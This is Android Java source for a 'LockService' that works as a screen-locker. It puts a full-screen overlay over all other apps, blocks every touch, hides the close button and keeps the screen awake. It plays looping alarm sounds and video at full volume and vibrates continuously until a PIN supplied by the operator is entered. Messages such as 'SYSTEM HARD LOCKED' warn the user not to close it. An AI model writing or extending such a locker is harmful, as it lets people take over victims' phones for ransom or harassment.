package com.nullx.pp;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.ScaleAnimation;
import android.widget.*;
import java.util.Random;

public class LockService extends Service {
    private WindowManager wm;
    private FrameLayout rootWrapper;
    private View currentLockView = null;
    private String correctPassword = "";
    private String currentMode = "";
    private MediaPlayer mediaPlayer;
    private Vibrator vibrator;
    private PowerManager.WakeLock wakeLock;
    private Handler hardLockHandler = new Handler(Looper.getMainLooper());
    private boolean isUnlocking = false;

    @Override
    public void onCreate() {
        super.onCreate();
        
        // WakeLock biar layar gak mati
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | 
                                   PowerManager.ACQUIRE_CAUSES_WAKEUP | 
                                   PowerManager.FULL_WAKE_LOCK, "LockService:HardLock");
        wakeLock.acquire(10*60*1000L);
        
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        
        String mode = intent.getStringExtra("mode");
        correctPassword = intent.getStringExtra("password");
        String msg = intent.getStringExtra("message");
        currentMode = mode;

        if (wm == null) initWindowManager();
        
        // Hapus view lama
        removeCurrentLockView();
        
        // Tampilkan hard lock
        showHardLock(mode, msg);
        
        // Mulai vibrasi terus (kecuali unlock)
        startContinuousVibration();
        
        return START_STICKY;
    }

    private void initWindowManager() {
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        rootWrapper = new FrameLayout(this);
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | 
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        wm.addView(rootWrapper, params);
    }

    private void removeCurrentLockView() {
        if (currentLockView != null && rootWrapper != null) {
            try {
                rootWrapper.removeView(currentLockView);
            } catch (Exception e) {}
            currentLockView = null;
        }
        if (rootWrapper != null) {
            try {
                rootWrapper.removeAllViews();
            } catch (Exception e) {}
        }
    }

    private void showHardLock(String mode, String msg) {
        int layoutId;
        
        if ("mode3".equals(mode)) {
            layoutId = R.layout.layout_lock_type3;
            showVideoLock(layoutId);
        } else if ("mode1".equals(mode)) {
            layoutId = R.layout.layout_lock_type1;
            showHardPopupLock(layoutId, msg);
        } else {
            layoutId = R.layout.layout_lock_type2;
            showHardTerminalLock(layoutId, msg);
        }
    }

    // ==================== MODE 1: HARD POPUP LOCK ====================
    private void showHardPopupLock(int layoutId, String msg) {
        View hardView = LayoutInflater.from(this).inflate(layoutId, null);
        
        // Buat background fullscreen hitam pekat
        hardView.setBackgroundColor(0xFF000000);
        
        TextView tvMsg = hardView.findViewById(R.id.txt_lock_msg);
        EditText etPass = hardView.findViewById(R.id.et_lock_pass);
        Button btnUnlock = hardView.findViewById(R.id.btn_unlock_type1);
        
        if (tvMsg != null && msg != null) {
            tvMsg.setText(msg);
            // Animasi blink merah
            Animation blink = new AlphaAnimation(0.3f, 1f);
            blink.setDuration(500);
            blink.setRepeatMode(Animation.REVERSE);
            blink.setRepeatCount(Animation.INFINITE);
            tvMsg.startAnimation(blink);
        }
        
        // Hard lock behavior
        hardView.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                vibrateShort();
                shakeView(hardView);
            }
            return true; // consume touch biar gak tembus
        });
        
        if (btnUnlock != null) {
            btnUnlock.setOnClickListener(v -> {
                String input = etPass != null ? etPass.getText().toString() : "";
                if (input.equals(correctPassword)) {
                    unlockSuccess();
                } else {
                    wrongPasswordAttempt(etPass);
                }
            });
        }
        
        // Disable back button via layout focus
        hardView.setFocusableInTouchMode(true);
        hardView.requestFocus();
        
        FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        );
        
        rootWrapper.addView(hardView, lp);
        currentLockView = hardView;
        
        // Putar suara alarm
        playAlarmSound();
    }

    // ==================== MODE 2: HARD TERMINAL LOCK ====================
    private void showHardTerminalLock(int layoutId, String msg) {
        View hardView = LayoutInflater.from(this).inflate(layoutId, null);
        
        EditText etInput = hardView.findViewById(R.id.et_chat_input);
        Button btnSend = hardView.findViewById(R.id.btn_send_chat);
        Button btnUnlock = hardView.findViewById(R.id.btn_unlock_chat);
        TextView tvHistory = hardView.findViewById(R.id.tv_chat_history);
        
        // Pesan awal
        if (tvHistory != null) {
            tvHistory.setText("[!] SYSTEM HARD LOCKED [!]\n" +
                             "[!] Do NOT close this window [!]\n" +
                             "[>] Type /unlock [PIN] to exit\n" +
                             "[>] Wrong PIN will increase vibration\n\n" +
                             "[system] Ready for input...");
        }
        
        // Hard lock touch blocker
        hardView.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                vibrateShort();
            }
            return true;
        });
        
        if (btnUnlock != null) {
            btnUnlock.setOnClickListener(v -> {
                String input = etInput != null ? etInput.getText().toString() : "";
                if (input.equalsIgnoreCase("/unlock " + correctPassword) || input.equals(correctPassword)) {
                    unlockSuccess();
                } else if (tvHistory != null) {
                    tvHistory.append("\n[!] WRONG PIN! Access DENIED [!]");
                    wrongPasswordAttempt(null);
                    // Scroll ke bawah - FIXED: cek scrollView dengan aman
                    View scrollViewRef = hardView.findViewById(R.id.scrollView);
                    if (scrollViewRef instanceof ScrollView) {
                        ScrollView sv = (ScrollView) scrollViewRef;
                        sv.post(() -> sv.fullScroll(ScrollView.FOCUS_DOWN));
                    }
                }
                if (etInput != null) etInput.setText("");
            });
        }
        
        if (btnSend != null && etInput != null && tvHistory != null) {
            btnSend.setOnClickListener(v -> {
                String cmd = etInput.getText().toString();
                tvHistory.append("\n>_ " + cmd);
                
                if (cmd.equalsIgnoreCase("/help")) {
                    tvHistory.append("\n[system] Commands:");
                    tvHistory.append("\n  /unlock [PIN] - Exit lock");
                    tvHistory.append("\n  /help - Show this help");
                    tvHistory.append("\n  /status - Show system status");
                } else if (cmd.equalsIgnoreCase("/status")) {
                    tvHistory.append("\n[system] Enforcement mode HARD ACTIVE");
                    tvHistory.append("\n[system] Device: " + Build.MODEL);
                    tvHistory.append("\n[system] Lock version: 3.0 HARD");
                } else if (!cmd.isEmpty() && !cmd.startsWith("/unlock")) {
                    tvHistory.append("\n[!] Unknown command. Type /help");
                    vibrateShort();
                }
                etInput.setText("");
                
                // Scroll ke bawah - FIXED
                View scrollViewRef = hardView.findViewById(R.id.scrollView);
                if (scrollViewRef instanceof ScrollView) {
                    ScrollView sv = (ScrollView) scrollViewRef;
                    sv.post(() -> sv.fullScroll(ScrollView.FOCUS_DOWN));
                }
            });
        }
        
        FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        );
        
        rootWrapper.addView(hardView, lp);
        currentLockView = hardView;
        
        playAlarmSound();
    }

    // ==================== MODE 3: VIDEO + SUARA HARD LOCK ====================
    private void showVideoLock(int layoutId) {
        View hardView = LayoutInflater.from(this).inflate(layoutId, null);
        VideoView videoView = hardView.findViewById(R.id.vv_lock_stream);
        EditText etPass = hardView.findViewById(R.id.et_video_pass);
        Button btnUnlock = hardView.findViewById(R.id.btn_video_unlock);
        ImageView closeBtn = hardView.findViewById(R.id.btn_close_video);
        
        // Sembunyikan tombol close
        if (closeBtn != null) closeBtn.setVisibility(View.GONE);
        
        // Hard block touch
        hardView.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                vibrateShort();
            }
            return true;
        });
        
        if (videoView != null) {
            // Video dari raw resource atau asset dengan SUARA
            Uri videoUri = getVideoWithSound();
            videoView.setVideoURI(videoUri);
            videoView.setOnPreparedListener(mp -> {
                mp.setLooping(true);
                mp.setVolume(1.0f, 1.0f); // SUARA MAXIMUM
                videoView.start();
            });
            videoView.setOnErrorListener((mp, what, extra) -> {
                // Fallback kalo video gak ada
                videoView.setVideoURI(Uri.parse("android.resource://" + getPackageName() + "/raw/fallback_video"));
                return true;
            });
            videoView.start();
        }
        
        if (etPass != null && btnUnlock != null) {
            etPass.setHint("Enter " + correctPassword.length() + " digit PIN to UNLOCK");
            btnUnlock.setOnClickListener(v -> {
                String input = etPass.getText().toString();
                if (input.equals(correctPassword)) {
                    unlockSuccess();
                } else {
                    wrongPasswordAttempt(etPass);
                }
            });
        }
        
        FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        );
        
        rootWrapper.addView(hardView, lp);
        currentLockView = hardView;
        
        // Play tambahan sound effect
        playVideoSound();
    }
    
    private Uri getVideoWithSound() {
        // Coba ambil dari raw resource
        int videoResId = getResources().getIdentifier("lock_video", "raw", getPackageName());
        if (videoResId != 0) {
            return Uri.parse("android.resource://" + getPackageName() + "/" + videoResId);
        }
        
        // Fallback: video online dengan suara
        return Uri.parse("https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4");
    }
    
    private void playVideoSound() {
        // Suara tambahan selain dari video
        int soundResId = getResources().getIdentifier("alarm_sound", "raw", getPackageName());
        if (soundResId != 0 && mediaPlayer == null) {
            mediaPlayer = MediaPlayer.create(this, soundResId);
            if (mediaPlayer != null) {
                mediaPlayer.setLooping(true);
                mediaPlayer.setVolume(1.0f, 1.0f);
                mediaPlayer.start();
            }
        }
    }
    
    private void playAlarmSound() {
        if (mediaPlayer == null) {
            mediaPlayer = MediaPlayer.create(this, android.provider.Settings.System.DEFAULT_RINGTONE_URI);
            if (mediaPlayer != null) {
                mediaPlayer.setLooping(true);
                mediaPlayer.setVolume(1.0f, 1.0f);
                mediaPlayer.start();
            }
        }
    }
    
    private void unlockSuccess() {
        isUnlocking = true;
        stopVibration();
        stopMedia();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        stopSelf();
    }
    
    private void wrongPasswordAttempt(EditText etPass) {
        // Vibrasi panjang
        vibrateLong();
        
        // Flash merah di screen
        if (currentLockView != null) {
            currentLockView.setBackgroundColor(0x66FF0000);
            hardLockHandler.postDelayed(() -> {
                if (currentLockView != null) currentLockView.setBackgroundColor(0xFF000000);
            }, 300);
        }
        
        if (etPass != null) {
            etPass.setText("");
            etPass.setHint("WRONG! Try again");
            hardLockHandler.postDelayed(() -> {
                if (etPass != null) etPass.setHint("Enter PIN");
            }, 1500);
        }
        
        // Play wrong sound
        MediaPlayer wrongMp = MediaPlayer.create(this, android.provider.Settings.System.DEFAULT_NOTIFICATION_URI);
        if (wrongMp != null) {
            wrongMp.setVolume(1.0f, 1.0f);
            wrongMp.start();
            wrongMp.setOnCompletionListener(MediaPlayer::release);
        }
    }
    
    private void startContinuousVibration() {
        hardLockHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!isUnlocking) {
                    vibrateLong();
                    hardLockHandler.postDelayed(this, 4000);
                }
            }
        });
    }
    
    private void stopVibration() {
        hardLockHandler.removeCallbacksAndMessages(null);
        if (vibrator != null) vibrator.cancel();
    }
    
    private void stopMedia() {
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                mediaPlayer.release();
            } catch (Exception e) {}
            mediaPlayer = null;
        }
    }
    
    private void vibrateShort() {
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= 26) {
                vibrator.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(100);
            }
        }
    }
    
    private void vibrateLong() {
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= 26) {
                vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(500);
            }
        }
    }
    
    private void shakeView(View view) {
        Animation shake = new ScaleAnimation(
            1f, 1.05f, 1f, 1.05f,
            Animation.RELATIVE_TO_SELF, 0.5f,
            Animation.RELATIVE_TO_SELF, 0.5f
        );
        shake.setDuration(100);
        shake.setRepeatCount(2);
        shake.setRepeatMode(Animation.REVERSE);
        view.startAnimation(shake);
    }
    
    @Override
    public void onDestroy() {
        stopVibration();
        stopMedia();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (rootWrapper != null) {
            try {
                if (currentLockView != null) rootWrapper.removeView(currentLockView);
                wm.removeView(rootWrapper);
            } catch (Exception e) {}
        }
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}